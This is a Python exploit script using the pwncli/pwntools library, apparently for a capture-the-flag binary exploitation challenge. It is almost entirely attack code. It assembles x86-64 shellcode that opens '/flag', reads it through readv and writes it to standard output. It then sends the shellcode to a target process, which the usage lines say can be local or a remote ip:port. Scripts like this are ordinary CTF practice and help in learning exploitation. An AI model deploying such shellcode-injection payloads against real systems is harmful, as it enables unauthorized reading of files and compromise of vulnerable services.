#!/usr/bin/env python3
# Date: 2025-07-04 20:55:30
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


rl()
code_addr=0x4040c0
code=asm('''
         /* open("/flag", 0, 0) */
         mov rax,2
         mov rdi,0x404140
         mov rsi,0
         mov rdx,0
         syscall
         
         /* readv(3, 0x404148, 1) */
         mov rax,19
         mov rdi,3
         mov rsi,0x404148
         mov rdx,1
         syscall

         /* write(1, 0x404800, 0x100) */
         mov rax,1
         mov rdi,1
         mov rsi,0x404800
         mov rdx,0x100
         syscall

''')

code=code.ljust(0x80)
code+=b'/flag\x00\x00\x00'+p64(0x404800)+p64(0x100)

s(code)
ia()
